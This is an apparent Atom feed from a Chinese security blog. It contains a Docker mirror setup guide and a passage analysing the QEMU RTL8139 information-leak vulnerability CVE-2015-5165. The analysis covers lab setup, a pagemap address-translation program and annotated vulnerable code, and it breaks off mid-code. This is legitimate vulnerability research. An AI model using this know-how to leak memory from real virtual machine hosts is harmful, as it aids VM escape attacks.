<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>程序人生</title>
  
  <subtitle>Fuzzing / Vulnerability / Exploit</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://programlife.net/"/>
  <updated>2020-09-12T11:56:22.000Z</updated>
  <id>http://programlife.net/</id>
  
  <author>
    <name>Ke Liu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ubuntu Snap Docker 国内加速镜像设置</title>
    <link href="http://programlife.net/2020/09/12/ubuntu-snap-docker-registry-mirrors/"/>
    <id>http://programlife.net/2020/09/12/ubuntu-snap-docker-registry-mirrors/</id>
    <published>2020-09-12T00:13:37.000Z</published>
    <updated>2020-09-12T11:56:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>为 Ubuntu 下通过 Snap 安装的 Docker 设置国内加速镜像（Registry Mirrors）。</p><a id="more"></a><p>关于 Ubuntu 下 Docker 国内加速镜像的设置，目前搜索引擎能搜到的文章大部分都是针对 apt 安装的 Docker 的，主要通过修改配置文件 <code>/etc/docker/daemon.json</code> 添加国内加速镜像地址（以中科大为例）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://docker.mirrors.ustc.edu.cn/"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关加速镜像还有：</p><ol><li>Docker 官方镜像 <code>https://registry.docker-cn.com</code></li><li>网易镜像 <code>https://hub-mirror.c.163.com</code></li><li>腾讯镜像 <code>https://mirror.ccs.tencentyun.com</code></li><li>七牛镜像 <code>https://reg-mirror.qiniu.com</code></li><li>阿里云镜像（需要注册登陆，无公开地址）</li></ol><p>目前最新的 Ubuntu 20.04 使用 snap 安装 Docker 非常方便，不需要修改源的设置，直接一条命令即可安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo snap install docker</span><br></pre></td></tr></table></figure><p>但是上述国内加速镜像的设置方法对通过 snap 安装的 Docker 无效！通过 snap 安装的 Docker 的配置文件位于 <code>/var/snap/docker/current/config/daemon.json</code> ，往其中添加加速镜像的设置即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cat /var/snap/docker/current/config/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">    "log-level":        "error",</span><br><span class="line">    "storage-driver":   "overlay2",</span><br><span class="line">    "registry-mirrors": ["https://hub-mirror.c.163.com"]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置好之后通过 snap 重启 Docker 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo snap restart docker</span><br></pre></td></tr></table></figure><p>通过 <code>docker info</code> 命令检查设置是否生效（观察 <strong>Registry Mirrors</strong> 字段）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Registry: https://index.docker.io/v1/</span><br><span class="line">Labels:</span><br><span class="line">Experimental: false</span><br><span class="line">Insecure Registries:</span><br><span class="line"> 127.0.0.0/8</span><br><span class="line">Registry Mirrors:</span><br><span class="line"> https://hub-mirror.c.163.com/</span><br><span class="line">Live Restore Enabled: false</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为 Ubuntu 下通过 Snap 安装的 Docker 设置国内加速镜像（Registry Mirrors）。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Docker" scheme="http://programlife.net/categories/Virtualization/Docker/"/>
    
    
      <category term="Ubuntu" scheme="http://programlife.net/tags/Ubuntu/"/>
    
      <category term="Snap" scheme="http://programlife.net/tags/Snap/"/>
    
      <category term="Docker" scheme="http://programlife.net/tags/Docker/"/>
    
      <category term="daemon.json" scheme="http://programlife.net/tags/daemon-json/"/>
    
  </entry>
  
  <entry>
    <title>QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用</title>
    <link href="http://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/"/>
    <id>http://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/</id>
    <published>2020-06-30T00:13:37.000Z</published>
    <updated>2020-07-01T12:44:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>参考 Phrack 文章 <strong><em>VM escape - QEMU Case Study</em></strong> [1] 对 QEMU 信息泄露漏洞 CVE-2015-5165 和堆溢出漏洞 CVE-2015-7504 进行调试分析并编写 Exploit 代码，本文主要分析其中的 RTL8139 网卡信息泄露漏洞 CVE-2015-5165。</p><a id="more"></a><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01. 环境搭建"></a>0x01. 环境搭建</h2><h3 id="1-1-宿主机创建"><a href="#1-1-宿主机创建" class="headerlink" title="1.1 宿主机创建"></a>1.1 宿主机创建</h3><p>在 VMware Workstation 中创建 Ubuntu 20.04 虚拟机，并为虚拟机的 CPU 开启虚拟化引擎相关选项，使之支持嵌套虚拟化，以便对 QEMU 进行调试分析。</p><p>安装好 Ubuntu 之后，可以先将源设置为国内的开源镜像网站，之后执行如下命令更新系统组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get upgrade</span></span><br></pre></td></tr></table></figure><p>编译 QEMU 需要 Python 2，因为 Ubuntu 20.04 中只有 Python 3，所以需要自行安装 Python 2：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/bin/python2 /usr/bin/python</span></span><br></pre></td></tr></table></figure><p>编译 QEMU 所依赖的其他库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev</span></span><br></pre></td></tr></table></figure><h3 id="1-2-QEMU-编译"><a href="#1-2-QEMU-编译" class="headerlink" title="1.2 QEMU 编译"></a>1.2 QEMU 编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> qemu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout bd80b59</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir -p bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ../../../configure --target-list=x86_64-softmmu \</span></span><br><span class="line">    --enable-debug --disable-werror</span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p>如果出现以下错误，给文件 <code>commands-posix.c</code> 增加头文件 <code>&lt;sys/sysmacros.h&gt;</code> 即可解决 [2]。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor':</span><br><span class="line">/repo/qemu/qga/commands-posix.c:640: undefined reference to `major'</span><br><span class="line">/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor'</span><br></pre></td></tr></table></figure><h3 id="1-3-虚拟机创建"><a href="#1-3-虚拟机创建" class="headerlink" title="1.3 虚拟机创建"></a>1.3 虚拟机创建</h3><p>QEMU 编译完成之后，需要创建一个用于调试漏洞的虚拟机。为了调试方便，这里安装 Ubuntu 20.04 Server 版本（比较新的 Ubuntu Server 没有 32 位的版本，但这里建议安装一个 32 位的系统，因为后面的 PoC 和 Exploit 都是针对 32 位环境编写的），相关命令如下所示 [3]：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./qemu-img create -f qcow2 ~/Desktop/vm/ubuntu.img 10G</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -boot d -cdrom \</span></span><br><span class="line">    /mnt/hgfs/share/ubuntu-20.04-live-server-amd64.iso \</span><br><span class="line">    -hda ~/Desktop/vm/ubuntu.img -m 1024</span><br></pre></td></tr></table></figure><p>这里还需要安装一个 VNC Viewer [4]，以便远程访问虚拟机，下载 deb 安装包后使用如下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb</span></span><br></pre></td></tr></table></figure><p>之后就可以通过 VNC Viewer 来访问虚拟机了。</p><h2 id="0x02-内存映射"><a href="#0x02-内存映射" class="headerlink" title="0x02. 内存映射"></a>0x02. 内存映射</h2><p>和 Host 操作系统一样，Guest 操作系统中的每个进程都有自己的虚拟地址空间，这里称之为 Guest Virtual Address，即 GVA；通过进程自身的页表（Page Table），Guest 操作系统可以将 GVA 转换为对应的 GPA（Guest Physical Address）。</p><p>Guest 操作系统的 GPA，实际上是对应的 QEMU 进程中映射的虚拟内存，即 HVA（Host Virtual Address）；Host 操作系统同样通过对应进程的页表，最终将其转换为对应的 HPA（Host Physical Address）。</p><p>待 Ubuntu Server 虚拟机安装完毕后，可以通过如下命令启动该虚拟机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback</span><br></pre></td></tr></table></figure><p>这里给虚拟机分配了 2GB 的内存，可以在对应的 QEMU 进程中找到对应的虚拟内存：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -e|grep qemu</span></span><br><span class="line">   4407 pts/1    00:01:14 qemu-system-x86</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /proc/4407/maps</span></span><br><span class="line">......</span><br><span class="line">7fe880021000-7fe884000000 ---p 00000000 00:00 0 </span><br><span class="line">7fe884000000-7fe904000000 rw-p 00000000 00:00 0         [2GB RAM]</span><br><span class="line">7fe904000000-7fe90465d000 rw-p 00000000 00:00 0 </span><br><span class="line">......</span><br><span class="line">7ffc9f4a1000-7ffc9f4c2000 rw-p 00000000 00:00 0         [stack]</span><br><span class="line">7ffc9f4fd000-7ffc9f500000 r--p 00000000 00:00 0         [vvar]</span><br><span class="line">7ffc9f500000-7ffc9f501000 r-xp 00000000 00:00 0         [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall]</span><br></pre></td></tr></table></figure><p>关于 Guest Virtual Address 到 Host Virtual Address 的转换，Phrack 的文章没怎么解释，在网上找到另一篇文章 [5] 解释的比较清楚（以 64 位系统为例）：</p><ol><li><p>每个页面的大小为 <code>4096</code> 字节，即 <code>1 &lt;&lt; 12</code> ；</p></li><li><p>基于 <code>/proc/pid/pagemap</code> 可以查看进程任意 Virtual Page 的状态，包括是否被映射到物理内存以及在物理内存中的 Page Frame Number（PFN）等；</p><ul><li><code>pagemap</code> 文件为每个 Virtual Page 存储 <code>64</code> 位（即 <code>8</code> 字节）的信息，数据格式如下：</li></ul></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Bits 0-54  page frame number (PFN) if present</span><br><span class="line">Bits 0-4   swap type if swapped</span><br><span class="line">Bits 5-54  swap offset if swapped</span><br><span class="line">Bit  55    pte is soft-dirty</span><br><span class="line">Bit  56    page exclusively mapped (since 4.2)</span><br><span class="line">Bits 57-60 zero</span><br><span class="line">Bit  61    page is file-page or shared-anon (since 3.5)</span><br><span class="line">Bit  62    page swapped</span><br><span class="line">Bit  63    page present</span><br></pre></td></tr></table></figure><ol start="3"><li><p>对任意的虚拟地址 <code>address</code> ，基于 <code>address / 4096</code> 可以计算出该虚拟地址在 <code>pagemap</code> 文件中的索引值， <code>address / 4096 * 8</code> 即对应的文件偏移值；</p></li><li><p>对任意的虚拟地址 <code>address</code> ，<code>address % 4096</code> 即虚拟地址在对应的内存页中的偏移值；</p></li><li><p>基于物理内存的 PFN 以及页内偏移，就可以计算出对应的物理地址；</p></li></ol><p>获取虚拟地址对应的物理地址的代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_addr(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(ptr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)ptr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* ptr = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">"Where am I?"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Physical address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, get_physical_addr(ptr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Press any key to exit...\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据文档 [6] 可知，只有拥有 <code>CAP_SYS_ADMIN</code> 权限的进程才可以读取到 PFN，否则虽然可以打开 <code>pagemap</code> 文件，但是读取到的 PFN 将会是 <code>0</code> 。</p><blockquote><p>Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.<br>In 4.0 and 4.1 opens by unprivileged fail with -EPERM.  Starting from<br>4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.<br>Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p></blockquote><p>编译好程序之后将其上传到 QEMU 虚拟机中以 <code>root</code> 身份执行，打印出物理地址为 <code>0x617192a0</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">Where am I?</span><br><span class="line">Physical address: 0x617192a0</span><br><span class="line">Press any key to exit...</span><br></pre></td></tr></table></figure><p>在宿主机中使用 GDB 附加到 QEMU 进程，可以看到虚拟机中的物理地址实际上就是 QEMU 进程为虚拟机分配的内存所在的 Host Virtual Address 的偏移地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo gdb qemu-system-x86 4407</span></span><br><span class="line">(gdb) x /s 0x7fe884000000 + 0x617192a0</span><br><span class="line">0x7fe8e57192a0:"Where am I?"</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03. 漏洞分析"></a>0x03. 漏洞分析</h2><h3 id="3-1-漏洞简介"><a href="#3-1-漏洞简介" class="headerlink" title="3.1 漏洞简介"></a>3.1 漏洞简介</h3><p>CVE-2015-5165 是 QEMU 在模拟 Realtek RTL8139 网卡时存在的一个漏洞，具体为文件 <code>hw\net\rtl8139.c</code> 中的函数 <code>rtl8139_cplus_transmit_one</code> 在发送数据时没有检查 IP 数据包头部的长度 <code>hlen</code> 与整个 IP 数据包的长度 <code>ip-&gt;ip_len</code> 之间的关系，导致在计算数据长度的时候存在整数溢出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*uint16_t*/</span> ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br></pre></td></tr></table></figure><p>利用该漏洞可以把越界读取到的数据通过网络发送出去。</p><h3 id="3-2-基础知识"><a href="#3-2-基础知识" class="headerlink" title="3.2 基础知识"></a>3.2 基础知识</h3><h4 id="3-2-1-Ethernet-Frame-Format"><a href="#3-2-1-Ethernet-Frame-Format" class="headerlink" title="3.2.1 Ethernet Frame Format"></a>3.2.1 Ethernet Frame Format</h4><p>OSI（Open Systems Interconnection）将网络协议分为七层，从上往下依次为：</p><ul><li>应用层</li><li>表示层</li><li>会话层</li><li>传输层</li><li>网络层</li><li>数据链路层</li><li>物理层</li></ul><p>以太网帧（Ethernet Frame）在数据链路层传输，格式参考下图中的灰色部分 [7]：</p><p><img src="/uploads/202006/ethernet-frame.png" alt="Ethernet Frame Format"></p><p>相关字段解释：</p><ul><li>DST / SRC 为目标 / 源的 MAC 地址</li><li><p>Length / Type：</p><ul><li>如果值小于等于 <code>1500</code> ，则表示 Payload 的长度</li><li>否则表示 Payload 数据所使用的协议，比如 <code>0x0800</code> 表示 IP 协议（这里指 IPv4）</li></ul></li><li><p>Payload 的 MTU（Maximum Transmission Unit）为 <code>1500</code> 字节，当数据超出 MTU 时需要进行分片处理</p></li></ul><h4 id="3-2-2-IP-Packet-Format"><a href="#3-2-2-IP-Packet-Format" class="headerlink" title="3.2.2 IP Packet Format"></a>3.2.2 IP Packet Format</h4><p>IP 数据包（这里指 IPv4）在网络层传输，格式参考下图 [7]：</p><p><img src="/uploads/202006/ip-packet.png" alt="IP Packet Format"></p><p>相关字段解释：</p><ul><li>IHL（Internet Header Length）表示 IP Header 的长度，最大可以是 <code>0b1111 * 4 = 60</code> 字节</li><li>Total Length 表示整个 IP Packet 的长度，最大可以是 <code>65535</code> 字节</li><li>IP Data 的最大长度为 <code>65535 - 20 = 65515</code> 字节<ul><li>此时 IP Header 的长度为 <code>20</code> 字节，Options 字段的长度为 <code>0</code> 字节</li></ul></li></ul><h4 id="3-2-3-TCP-Segment-Format"><a href="#3-2-3-TCP-Segment-Format" class="headerlink" title="3.2.3 TCP Segment Format"></a>3.2.3 TCP Segment Format</h4><p>TCP 报文在传输层传输，格式参考下图 [7]：</p><p><img src="/uploads/202006/tcp-segment.png" alt="TCP Segment Format"></p><p>和 IP 数据包一样，TCP 报文头部的长度由 <code>Header Length</code> 字段指明，最大可以是 <code>0b1111 * 4 = 60</code> 字节，在 <code>Options</code> 字段为空的情况下头部长度为 <code>20</code> 字节。</p><h3 id="3-3-漏洞分析"><a href="#3-3-漏洞分析" class="headerlink" title="3.3 漏洞分析"></a>3.3 漏洞分析</h3><p>漏洞位于文件 <code>hw\net\rtl8139.c</code> 中的函数 <code>rtl8139_cplus_transmit_one</code> ，相关代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_ADDR_LEN 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_TYPE_LEN 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HLEN (ETHER_ADDR_LEN * 2 + ETHER_TYPE_LEN)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_IP    0x0800      <span class="comment">/* Internet Protocol packet */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_8021Q 0x8100      <span class="comment">/* 802.1Q VLAN Extended Header  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_MTU     1500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ip packet header */</span></span><br><span class="line">ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// saved_buffer 指向 Ethernet Frame, 这里读取 Length/Type 字段</span></span><br><span class="line"><span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line"><span class="keyword">if</span> (proto == ETH_P_IP)  <span class="comment">// Payload 为 IP Packet</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode has IP packet\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* not aligned */</span></span><br><span class="line">    eth_payload_data = saved_buffer + ETH_HLEN; <span class="comment">// Payload 数据</span></span><br><span class="line">    eth_payload_len  = saved_size   - ETH_HLEN; <span class="comment">// Payload 大小</span></span><br><span class="line"></span><br><span class="line">    ip = (ip_header*)eth_payload_data;          <span class="comment">// IP Packet</span></span><br><span class="line">    <span class="comment">// 检查是否为 IPv4</span></span><br><span class="line">    <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode packet has bad IP version %d "</span></span><br><span class="line">            <span class="string">"expected %d\n"</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">            IP_HEADER_VERSION_4);</span><br><span class="line">        ip = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        hlen = IP_HEADER_LENGTH(ip);            <span class="comment">// IP 头长度</span></span><br><span class="line">        ip_protocol = ip-&gt;ip_p;</span><br><span class="line">        <span class="comment">// 计算 IP 数据包中数据的长度, 这里 ip_data_len 的类型为 uint16_t</span></span><br><span class="line">        <span class="comment">// 当 be16_to_cpu(ip-&gt;ip_len) &lt; hlen 触发整数溢出</span></span><br><span class="line">        <span class="comment">// ip_data_len 最大可以是 0xFFFF</span></span><br><span class="line">        ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里尝试从 Ethernet Frame 中解析 IPv4 数据包，在计算 IP 数据包中的数据长度时，在进行减法运算前并没有比较两个操作数的大小关系，通过触发整数溢出使得 <code>ip_data_len</code> 的最大值可以是 <code>0xFFFF</code> 。</p><p>紧接着是发送数据包，如果是 TCP 数据（ <code>IP_PROTO_TCP</code> ）且数据量过大（设置了 <code>CP_TX_LGSEN</code> 标记），则会进行分片处理，即切分成多个 IP 数据包进行发送；此时 <code>ip_data_len</code> 将被用于计算 <code>tcp_data_len</code> 的值：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pointer to TCP header */</span></span><br><span class="line">tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> 